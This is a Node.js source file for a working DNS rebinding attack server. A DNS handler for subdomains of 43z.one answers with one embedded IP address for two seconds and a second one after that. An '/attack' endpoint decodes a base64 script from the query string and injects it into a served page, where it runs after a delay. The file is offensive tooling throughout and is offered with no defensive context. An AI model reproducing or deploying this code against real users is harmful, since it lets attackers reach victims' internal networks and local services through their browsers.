const http = require('http')
const httpPort = 5000

const express = require('express')
const app = express()
app.use(express.static('public'))

const dns = require('node-named')
const dnsPort = 53

const dnsServer = dns.createServer()

dnsServer.listen(dnsPort, '::ffff:0.0.0.0', ()=> {
  console.log(`DNS server is listening on ${dnsPort}`)
})

let cache = {}

dnsServer.on('query', query => {
  const domain = query.name()
  const type = query.type()

  const splits = domain.split('.')

  if(domain.indexOf('43z.one') < 0)
    return

  if(splits.length != 6)
    return

  if(type != 'A')
    return

  const ip1 = splits[1].replace(/-/g, '.')
  const ip2 = splits[2].replace(/-/g, '.')

  if(!cache[domain]){
    cache[domain] = {
      timeStamp: Date.now()
    }
  }

  let record

  if(cache[domain].timeStamp > Date.now() - 2000){
    record = new dns.ARecord(ip1)
  }else{
    record = new dns.ARecord(ip2)
  }

  query.addAnswer(domain, record, 0)
  dnsServer.send(query)
  console.log(`DNS A Query for ${domain} replied with ${record.target}`)
})

app.get('/attack', (req, res) => {
  if(!req.query.script)
    res.end()

  const script = new Buffer(req.query.script, 'base64').toString('ascii')

  res.end(`
    <html>
      <script>
        setTimeout(function(){
          ${script} 
        }, 3000)
      </script>
    </html>
  `)
})

app.listen(httpPort,'127.0.0.1', () => {
  console.log(`HTTP server is listening on ${httpPort}`)
})
